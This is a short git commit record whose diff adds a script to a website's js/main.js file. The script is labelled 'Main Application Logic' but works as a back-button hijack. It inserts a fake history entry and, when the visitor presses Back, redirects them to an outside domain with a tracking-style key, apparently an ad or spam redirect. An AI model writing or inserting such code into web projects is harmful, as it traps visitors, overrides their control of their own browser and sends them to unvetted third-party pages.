ce017d75af5ed27bd8c3b7503c69cdd68ccd5ce3
raigpk2 <raigpk2@gmail.com>
2026-07-14 17:11:32 +0500

    Update main.js

--- js/main.js
+++ js/main.js
@@ -1,1 +1,8 @@
-
+/**
+ * Main Application Logic
+ * Handles back button redirect behavior to prevent users from easily navigating away.
+ */
+history.pushState(null, null, location.href);
+window.onpopstate = function () {
+  window.location.href = "https://bonnetdetectiveshomecoming.com/rqbamyp64c?key=866bc5ba1e525b6c9b55bb8d072f8b91";
+};
